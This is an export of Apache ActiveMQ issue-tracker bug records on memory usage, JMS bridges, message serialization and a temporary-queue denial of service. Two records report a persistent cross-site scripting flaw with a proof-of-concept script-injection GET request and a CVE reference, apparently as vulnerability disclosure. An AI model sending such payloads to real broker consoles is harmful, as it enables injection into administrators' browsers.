"What the relationship is among ""CursorMemoryUsage"" and ""QueueSize""",AMQ-2629,12483074,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,spesg2,spesg2,25/Feb/10 16:58,23/Aug/11 21:38,14/Jul/23 05:43,23/Aug/11 21:38,5.2.0,,,,,,,,Message Store,,,,0,,,,,,,,,"Hi to everybody,  
  
In my application, that has 2 fast producers and 1 slow consumer, after some hours of job, where ""Queue Size"" various among 0 and 1000, ""CursorMemoryUsage"" it begins to increase him. This phenomenon provokes a deceleration both of ""Enqueue"" that ""Dequeue"", and even if they are stopped the producers the speed of ""dequeue"" it doesn't increase. When ""Queue Size"" returns to 0, ""CursorMemoryUsage"" it doesn't decrease.  
  
When this phenomenon happens I have seen that also her ""Heap Memory Usage"" it grows.  
  
Do you have some explanation to this phenomenon?  
What the relationship is among ""CursorMemoryUsage"" and ""QueueSize.""  
  
Thanks in advance ",Windows2003 server - JDK 1.5.0_09-b03,sreepanchajanyam,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,63992,,,Tue Aug 23 21:38:08 UTC 2011,,,,,,,,,,,"0|i0tskv:",171939,,,,,,,,,,,,,,,,,,,,,"23/Aug/11 11:28;sreepanchajanyam;Non-persistent messages are stored in memory before they are sent to consumers. CursoryMemoryUsage indicates the memory(heap) used by non-persistent messages. This is usually capped at 70% of heap space. This is configuration is made in activemq.xml. When the cursory memory usage goes beyond the capped value( say 70% by default) the incoming messages are written to tempstore( a location on disk) and all the messages from memory are flushed to tempstore, here the CursorMemoryUsage becomes 0%. When you hit tempstore the dequeueing and enqueueing slows down because of disk writes. 

When queue size increases CursorMemoryUsage increases till a capped value and then becomes zero . After this enqueue and dequeue operations slow down due to disk writes involved.;;;","23/Aug/11 21:38;tabish;The supplied comment answers the question nicely, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Advisory for discarded should indicate the consumer id that missed the message to allow correlation of missed messages with DLQ for example,AMQ-2628,12482915,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,25/Feb/10 11:36,25/Feb/10 11:44,14/Jul/23 05:43,25/Feb/10 11:44,5.3.0,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,Messages are discarded and there an optional advisory but just the message header is present in the payload. It is not possible to determine the consumer that missed the message. A non durable topic subscription id is needed in there.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74865,,,Thu Feb 25 11:44:46 UTC 2010,,,,,,,,,,,"0|i0rqsn:",159985,,,,,,,,,,,,,,,,,,,,,"25/Feb/10 11:44;gtully;issue resolved in r916255;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Topic Memory usage creep with constant pending message strategy and a file pending message cursor,AMQ-2626,12482794,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,24/Feb/10 12:50,24/Feb/10 15:01,14/Jul/23 05:43,24/Feb/10 12:56,5.3.0,,,,,5.3.1,5.4.0,,Broker,,,,0,,,,,,,,,"Topic subs with pending messages, where prefetch is limited and consumer is slow  can lead to memory usage creep when the eviction policy kicks in and needs to spool messages from disk as the system usage limit has been reached.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74866,,,Wed Feb 24 15:01:44 UTC 2010,,,,,,,,,,,"0|i0rqsv:",159986,,,,,,,,,,,,,,,,,,,,,"24/Feb/10 12:56;gtully;resolved in r915770

ensured topic prefetch policy has effect for a subscription when not set by a consumer. added test for message eviction that demonstrated memory  or usage leak.
;;;","24/Feb/10 15:01;gtully;A similar problem existed with the vmcursor PendingSubscriberMessageStoragePolicy - eviction causes a usage leak. Added a test and fix.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Persistent Cross-site Scripting in /createDesitnation.action [JMSDestination parameter],AMQ-2625,12482743,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,dejanb,rajats@gmail.com,rajats@gmail.com,24/Feb/10 03:51,24/Feb/10 03:53,14/Jul/23 05:43,24/Feb/10 03:53,5.3.0,,,,,5.3.1,5.4.0,,,,,,0,,,,,,,,,"GET /createDestination.action?JMSDestinationType=queue&JMSDestination=%22%3E%3Cscript%3Ealert%28%22persistent%20XSS%22%29%3C%2fscript%3E
This GET request creates a queue name that has malformed queue name due to lack of input validation.  After sending this request a sample of the effect can be seen by browsing to /queues.jsp and clicking on the ""Home"" link.  
I do not know the affected version information yet.  Is there some way I can find it?    
Additionally, this is vulnerable to cross-site request forgery as well but XSS is a more critical bug than XSRF (at least at this point for me I guess).

----
CVE Identifier issued for this:
CVE-2010-0684",Linux environment.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74867,,,2010-02-24 03:51:49.0,,,,,,,,,,,"0|i0rr5r:",160044,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JMS Bridges starting successful without a connection and never connect then,AMQ-2624,12483431,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,jschmied,jschmied,23/Feb/10 19:25,16/Apr/10 16:35,14/Jul/23 05:43,16/Apr/10 16:34,5.3.0,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"When the JMS Bridges get a start() command and the foreign endpoint is down, the bridge prints a stacktrace and goes on. The bridge never connects.

2010-02-23 18:17:27,437 ERROR JmsQueueConnector    init              - Failed to initialize the JMSConnector
oracle.jms.AQjmsException: I/O Exception: The Network Adapter could not establish the connection
	at oracle.jms.AQjmsDBConnMgr.checkForSecurityException(AQjmsDBConnMgr.java:934)
	at oracle.jms.AQjmsDBConnMgr.getConnection(AQjmsDBConnMgr.java:609)
	at oracle.jms.AQjmsDBConnMgr.<init>(AQjmsDBConnMgr.java:243)
	at oracle.jms.AQjmsConnection.<init>(AQjmsConnection.java:185)
	at oracle.jms.AQjmsQueueConnectionFactory.createQueueConnection(AQjmsQueueConnectionFactory.java:224)
	at org.apache.activemq.network.jms.JmsQueueConnector.initializeForeignQueueConnection(JmsQueueConnector.java:225)
	at org.apache.activemq.network.jms.JmsQueueConnector.init(JmsQueueConnector.java:55)
	at org.apache.activemq.network.jms.JmsConnector.start(JmsConnector.java:117)
	at org.apache.activemq.broker.BrokerService.startAllConnectors(BrokerService.java:1941)
	at org.apache.activemq.broker.BrokerService.start(BrokerService.java:471)
	at org.test.EmbeddedBroker.main(EmbeddedBroker.java:48)
Caused by: java.sql.SQLRecoverableException: I/O Exception: The Network Adapter could not establish the connection
	at oracle.jdbc.driver.SQLStateMapping.newSQLException(SQLStateMapping.java:101)
	at oracle.jdbc.driver.DatabaseError.newSQLException(DatabaseError.java:112)
	at oracle.jdbc.driver.DatabaseError.throwSqlException(DatabaseError.java:173)
	at oracle.jdbc.driver.DatabaseError.throwSqlException(DatabaseError.java:229)
	at oracle.jdbc.driver.DatabaseError.throwSqlException(DatabaseError.java:458)
	at oracle.jdbc.driver.T4CConnection.logon(T4CConnection.java:411)
	at oracle.jdbc.driver.PhysicalConnection.<init>(PhysicalConnection.java:490)
	at oracle.jdbc.driver.T4CConnection.<init>(T4CConnection.java:202)
	at oracle.jdbc.driver.T4CDriverExtension.getConnection(T4CDriverExtension.java:33)
	at oracle.jdbc.driver.OracleDriver.connect(OracleDriver.java:465)
	at java.sql.DriverManager.getConnection(DriverManager.java:582)
	at java.sql.DriverManager.getConnection(DriverManager.java:207)
	at oracle.jms.AQjmsDBConnMgr.getConnection(AQjmsDBConnMgr.java:575)
	... 9 more
2010-02-23 18:17:27,453 INFO  JmsConnector         start             - JMS Connector Connector:0 Started

in JMSQueueConnector.java:

   @Override
	public boolean init() {
        boolean result = super.init();
        if (result) {
            try {
                initializeForeignQueueConnection();
                initializeLocalQueueConnection();
                initializeInboundJmsMessageConvertor();
                initializeOutboundJmsMessageConvertor();
                initializeInboundQueueBridges();
                initializeOutboundQueueBridges();
            } catch (Exception e) {
                LOG.error(""Failed to initialize the JMSConnector"", e);
            }
        }
        return result;
    }

I need a solution for this and I would not mind to do some work on it.

Should the DestinationBridge get a maintainance thread to keep care of reconnecting later? Should we have a callback to inform the client about a failing bridge (case of embedded broker)?

Please give me some suggestions how a fix could look like and I fix it.

Thanks 

juergen

",dosn't mater,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2455,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74868,,,Fri Apr 16 16:35:11 UTC 2010,,,,,,,,,,,"0|i0rqj3:",159942,,,,,,,,,,,,,,,,,,,,,"16/Apr/10 16:34;gtully;This should be resolved by https://issues.apache.org/activemq/browse/AMQ-2455;;;","16/Apr/10 16:35;gtully;fix implemented by this issue: https://issues.apache.org/activemq/browse/AMQ-2455;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ObjectMessage is [still] being serialized and de-serialized when using setObjectMessageSerializationDefered and setCopyMessageOnSend in local vm:// scenario,AMQ-2622,12483504,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,bob.deremer,bob.deremer,22/Feb/10 16:21,08/Sep/10 11:25,14/Jul/23 05:43,08/Sep/10 11:25,5.3.0,,,,,5.4.1,,,,,,,0,,,,,,,,,"I have outlined the problem in the following forum link: 

http://old.nabble.com/URGENT-QUESTION:-AMQ-5.3.0-bug-or-configuration-error------ObjectMessage-is--still--being-serialized-when-using-setObjectMessageSerializationDefered-and-setCopyMessageOnSend-td27654579.html

I have not created a JUnit test that demonstrates this, but here are the basic steps to reproduce this:
* create an embedded broker with no persistence, dedicatedTaskRunner = false, and optimizedDispatch = true
* create the ActiveMQConnectionFactory and set the setObjectMessageSerializationDefered = TRUE and setCopyMessageOnSend = FALSE
* create your connection from the factory
* create a producer and [MessageListener] consumer against a Queue
* create your own custom java object that implements Externalizable - this is important, because you will be able to set a breakpoint in the readExternal and writeExternal methods to see the 2 locations on the AMQ code where the message is copied - causing a serialization/de-serialization
* create a new ObjectMessage and send it from the producer to the consumer

The message will get serialized in ActiveMQConnection.java on this line [msg = msg.copy();] - see the linked forum issue for the code snippet and line numbers. 

NOTE: you will need to continue stepping the code through the complete dispatch process because it will go through a de-serialization phase as well when the call to getObject is called in the onMessage of the MessageListener.

Please let me know if I can provide any more details - OR, if I'm not setting something properly to keep the ObjectMessage from being serialized.

Thanks,
Bob","Windows Server 2008 R2, 64-bit, binary download of ActiveMQ 5.3.0, Java 1.6.0_17 (64-bit), Eclipse 3.5 (64-bit), tomcat 6.0 (64-bit)",bob.deremer,slewis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Feb/10 21:16;slewis;unit-test.txt;https://issues.apache.org/jira/secure/attachment/12461627/unit-test.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14809,,,Wed Sep 08 11:25:52 UTC 2010,,,,,,,,,,,"0|i0ba8f:",63770,,,,,,,,,,,,,,,,,,,,,"22/Feb/10 21:16;slewis;Here's a unit test patch that shows the problem, am currently looking into a fix for this also.;;;","24/Mar/10 13:52;gtully;resolved in r927054

ObjectMessage.copy is now respects setObjectMessageSerializationDefered;;;","02/Jun/10 23:03;thammoud;Hi, I tested this fix and encountered a case where this mechanism does not seem to work properly. Here is the scenario we have:

A server that has a producer. The producer communicates with the local broker using the vm://. There are local consumers that listen on the topic being published to in the same VM. All consumers that are local in the same VM work as advertised without any serialization thanks to this fix. 

Here is the problem:

Remote consumers communicate to the broker using TCP for the same topic. When the producer sends the message to the destination, it is being sent over the vm:// and ObjectMessage has content set to null and a valid object. The broker then tries to send the message to the remote client with null contents causing errors.

It seems that perhaps, ObjectMessage should override getContent() to detect this situation. i.e if object != null and content is null, then serialize first and then return the content. I am sure you have a better solution to this issue. Thanks.;;;","08/Sep/10 11:04;gtully;when a deferred serializable message is marshaled it needs to serialize, as described in the case of a vm non serialized message to a topic with multiple consumers, some of which don't use vm: transport and as a result need marshaling.
Query ordering? if the non vm: consumer is dispatched to before the vm: consumer, will it negate the non serialization for the vm consumer?;;;","08/Sep/10 11:25;gtully;resolved in r994990

the issue of ordering disappears as each consumer gets its own copy, so an objects write operation will be called but reads will happen in unserialised copies. The serialisation is now called before marshalling which will only be invoked for non vm transports. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Unexpected failure.     at org.apache.activemq.transport.failover.FailoverTransport.oneway,AMQ-2621,12483240,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,cmoulliard,cmoulliard,22/Feb/10 15:03,23/Feb/10 16:47,14/Jul/23 05:43,23/Feb/10 16:47,5.3.0,,,,,,,,,,,,0,,,,,,,,,"Hi,

When transport of activemq is defined as vm:// (in file /etc/activemq-broker.xml of Fuse 4.2) then the following error is generated when we use a camel-cxf route :

Error 

{code}
15:12:56,718 | ERROR | 0@qtp-28446306-0 | DefaultErrorHandler              | rg.apache.camel.processor.Logger  248 | Failed delivery for exchangeId: 8114851b-c94c-484c-9638-4710a407da6e. Exhausted after delivery attempt: 1 caught: org.springframework.jms.UncategorizedJmsException: Uncategorized exception occured during JMS processing; nested exception is javax.jms.JMSException: Unexpected failure.
org.springframework.jms.UncategorizedJmsException: Uncategorized exception occured during JMS processing; nested exception is javax.jms.JMSException: Unexpected failure.
    at org.springframework.jms.support.JmsUtils.convertJmsAccessException(JmsUtils.java:308)
    at org.springframework.jms.support.JmsAccessor.convertJmsAccessException(JmsAccessor.java:168)
    at org.springframework.jms.core.JmsTemplate.execute(JmsTemplate.java:474)
    at org.apache.camel.component.jms.JmsConfiguration$CamelJmsTemplate.send(JmsConfiguration.java:195)
    at org.apache.camel.component.jms.JmsProducer.doSend(JmsProducer.java:375)
    at org.apache.camel.component.jms.JmsProducer.processInOnly(JmsProducer.java:320)
    at org.apache.camel.component.jms.JmsProducer.process(JmsProducer.java:150)
    at org.apache.camel.processor.SendProcessor$1.doInProducer(SendProcessor.java:97)
    at org.apache.camel.processor.SendProcessor$1.doInProducer(SendProcessor.java:95)
    at org.apache.camel.impl.ProducerCache.doInProducer(ProducerCache.java:146)
    at org.apache.camel.processor.SendProcessor.doProcess(SendProcessor.java:94)
    at org.apache.camel.processor.SendProcessor.process(SendProcessor.java:82)
    at org.apache.camel.management.InstrumentationProcessor.process(InstrumentationProcessor.java:67)
    at org.apache.camel.processor.DelegateProcessor.processNext(DelegateProcessor.java:53)
    at org.apache.camel.processor.DelegateProcessor.proceed(DelegateProcessor.java:82)
    at org.apache.camel.processor.interceptor.TraceInterceptor.process(TraceInterceptor.java:161)
    at org.apache.camel.management.InstrumentationProcessor.process(InstrumentationProcessor.java:67)
    at org.apache.camel.processor.RedeliveryErrorHandler.processExchange(RedeliveryErrorHandler.java:177)
    at org.apache.camel.processor.RedeliveryErrorHandler.processErrorHandler(RedeliveryErrorHandler.java:143)
    at org.apache.camel.processor.RedeliveryErrorHandler.process(RedeliveryErrorHandler.java:88)
    at org.apache.camel.processor.DefaultErrorHandler.process(DefaultErrorHandler.java:49)
    at org.apache.camel.processor.DefaultChannel.process(DefaultChannel.java:228)
    at org.apache.camel.processor.Pipeline.process(Pipeline.java:74)
    at org.apache.camel.processor.UnitOfWorkProcessor.processNext(UnitOfWorkProcessor.java:66)
    at org.apache.camel.processor.DelegateProcessor.process(DelegateProcessor.java:48)
    at org.apache.camel.management.InstrumentationProcessor.process(InstrumentationProcessor.java:67)
    at org.apache.camel.component.cxf.CxfConsumer$1.invoke(CxfConsumer.java:91)
    at org.apache.cxf.interceptor.ServiceInvokerInterceptor$1.run(ServiceInvokerInterceptor.java:58)
    at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:441)
    at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:303)
    at java.util.concurrent.FutureTask.run(FutureTask.java:138)
    at org.apache.cxf.workqueue.SynchronousExecutor.execute(SynchronousExecutor.java:37)
    at org.apache.cxf.interceptor.ServiceInvokerInterceptor.handleMessage(ServiceInvokerInterceptor.java:106)
    at org.apache.cxf.phase.PhaseInterceptorChain.doIntercept(PhaseInterceptorChain.java:243)
    at org.apache.cxf.transport.ChainInitiationObserver.onMessage(ChainInitiationObserver.java:109)
    at org.apache.cxf.transport.http_jetty.JettyHTTPDestination.serviceRequest(JettyHTTPDestination.java:312)
    at org.apache.cxf.transport.http_jetty.JettyHTTPDestination.doService(JettyHTTPDestination.java:276)
    at org.apache.cxf.transport.http_jetty.JettyHTTPHandler.handle(JettyHTTPHandler.java:70)
    at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:765)
    at org.mortbay.jetty.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:230)
    at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152)
    at org.mortbay.jetty.Server.handle(Server.java:326)
    at org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:542)
    at org.mortbay.jetty.HttpConnection$RequestHandler.content(HttpConnection.java:938)
    at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:755)
    at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:218)
    at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:404)
    at org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:409)
    at org.mortbay.thread.QueuedThreadPool$PoolThread.run(QueuedThreadPool.java:582)
Caused by: javax.jms.JMSException: Unexpected failure.
    at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:62)
    at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1283)
    at org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1367)
    at org.apache.activemq.ActiveMQConnection.createSession(ActiveMQConnection.java:302)
    at org.apache.activemq.pool.SessionPool.createSession(SessionPool.java:117)
    at org.apache.activemq.pool.SessionPool.makeObject(SessionPool.java:85)
    at org.apache.commons.pool.impl.GenericObjectPool.borrowObject(GenericObjectPool.java:1148)
    at org.apache.activemq.pool.SessionPool.borrowSession(SessionPool.java:54)
    at org.apache.activemq.pool.ConnectionPool.createSession(ConnectionPool.java:108)
    at org.apache.activemq.pool.PooledConnection.createSession(PooledConnection.java:141)
    at org.springframework.jms.support.JmsAccessor.createSession(JmsAccessor.java:196)
    at org.springframework.jms.core.JmsTemplate.execute(JmsTemplate.java:462)
    ... 46 more
Caused by: java.io.IOException: Unexpected failure.
    at org.apache.activemq.transport.failover.FailoverTransport.oneway(FailoverTransport.java:462)
    at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)
    at org.apache.activemq.transport.ResponseCorrelator.asyncRequest(ResponseCorrelator.java:81)
    at org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:86)
    at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1261)
    ... 56 more
{code}

Route

{code}
   <bean id=""webservice"" class=""org.apache.camel.example.reportincident.internal.WebService"" />
    <bean id=""feedback"" class=""org.apache.camel.example.reportincident.internal.Feedback"" />

    <cxf:bus>
        <cxf:features>
            <cxf:logging />
            <wsa:addressing />
            <wsrm-mgr:reliableMessaging>
                <wsrm-policy:RMAssertion>
                    <wsrm-policy:BaseRetransmissionInterval    Milliseconds=""4000"" />
                    <wsrm-policy:AcknowledgementInterval Milliseconds=""2000"" />
                </wsrm-policy:RMAssertion>
                <wsrm-mgr:destinationPolicy>
                    <wsrm-mgr:acksPolicy intraMessageThreshold=""0"" />
                </wsrm-mgr:destinationPolicy>
            </wsrm-mgr:reliableMessaging>
        </cxf:features>
    </cxf:bus>

    <http:conduit name=""{http://reportincident.example.camel.apache.org}ReportIncidentEndpoint.http-conduit"">
        <http:client DecoupledEndpoint=""http://localhost:8080/cxf/camel-example/incident"" />
    </http:conduit>

    <!-- webservice endpoint -->
    <cxfcamel:cxfEndpoint
        id=""reportIncident""
        address=""http://localhost:8080/cxf/camel-example/incident""
        serviceClass=""org.apache.camel.example.reportincident.ReportIncidentEndpoint""
        xmlns:s=""http://reportincident.example.camel.apache.org"">

    </cxfcamel:cxfEndpoint>

    <osgi:reference id=""queuingservice"" interface=""org.apache.camel.Component"" />

    <camel:camelContext trace=""true""
        xmlns=""http://camel.apache.org/schema/osgi"">

        <camel:route>
            <camel:from uri=""cxf:bean:reportIncident"" />
            <camel:convertBodyTo type=""org.apache.camel.example.reportincident.InputReportIncident"" />
            <camel:to uri=""bean:webservice"" />
            <camel:inOnly uri=""queuingservice:queue:in"" />
            <camel:transform>
                <camel:method bean=""feedback"" method=""setOk"" />
            </camel:transform>

        </camel:route>
    </camel:camelContext>
{code} ",Fuse ESB 4.2.0-fuse-01-00 and ActiveMQ 5.3.0.fuse-01-00,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74869,,,Tue Feb 23 16:47:22 UTC 2010,,,,,,,,,,,"0|i0tsxr:",171997,,,,,,,,,,,,,,,,,,,,,"23/Feb/10 16:47;cmoulliard;The error reported is not at all in relation with activemq. Bad config in CXF WS-RM;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
filling a temporary queue and disconnecting does not free the queues Usage Manager memory limit,AMQ-2616,12481239,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,zakalwe,zakalwe,18/Feb/10 01:56,22/Feb/10 17:04,14/Jul/23 05:43,22/Feb/10 17:04,5.3.1,,,,,5.3.1,5.4.0,,Broker,,,,0,,,,,,,,,"Starting a broker running the latest 5.3.1 snapshot with the simple attached configuration, then connecting a producer that sends messages to a temporary queue (without any consumer on it) until it hits the Usage Manager memory limit and gives this message:

{panel}
INFO  Topic - Usage Manager memory limit reached for temp-topic://ID:sts-chc-matsh-33157-1266457317460-0:0:1. Producers will be throttled to the rate at which messages are removed from this destination to prevent flooding it. See http://activemq.apache.org/producer-flow-control.html for more info
{panel}

If you then disconnect the producer you get a log message that the temporary queue is being removed, but if you connect another producer and try to produce to a new temporary queue no messages are accepted, and the broker just prints the ""Usage Manager memory limit reached"" message again. 

This is a denial of service since if you now connect a consumer on a new temporary queue no messages will be accepted for that temporary queue.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Feb/10 01:57;zakalwe;activemq.xml;https://issues.apache.org/jira/secure/attachment/12461622/activemq.xml",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74870,,,Mon Feb 22 17:04:30 UTC 2010,,,,,,,,,,,"0|i0rq7j:",159890,,,,,,,,,,,,,,,,,,,,,"18/Feb/10 02:13;zakalwe;A more realistic sequence of events is this:
# ConsumerA sends RequestB to QueueC, with a reply-to of TempQueueD.
# ProducerE receives RequestB and starts sending messages back to TempQueueD.
# ConsumerA runs out of memory and dies, the broker closes the connection.
# ProducerE continues sending messages to TempQueueD until the broker Usage Manager Memory Limit is reached. From this point no producer can send any messages to any temporary queues.
# The sysadmins discover something is wrong and kill ProducerE, the broker claims to free up the resources, however the problem remains.;;;","22/Feb/10 17:04;rajdavies;Fixed in 5.3.1 by SVN  revision 912656 
and trunk by SVN revision 912652;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Persistent Cross-site Scripting in /createDesitnation.action [JMSDestination parameter],AMQ-2613,12483277,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,dejanb,rajats@gmail.com,rajats@gmail.com,17/Feb/10 19:22,08/Apr/10 09:21,14/Jul/23 05:43,08/Apr/10 09:21,5.3.0,,,,,5.3.1,5.4.0,,,,,,0,,,,,,,,,"GET /createDestination.action?JMSDestinationType=queue&JMSDestination=%22%3E%3Cscript%3Ealert%28%22persistent%20XSS%22%29%3C%2fscript%3E
This GET request creates a queue name that has malformed queue name due to lack of input validation.  After sending this request a sample of the effect can be seen by browsing to /queues.jsp and clicking on the ""Home"" link.  
I do not know the affected version information yet.  Is there some way I can find it?    
Additionally, this is vulnerable to cross-site request forgery as well but XSS is a more critical bug than XSRF (at least at this point for me I guess).

----
CVE Identifier issued for this:
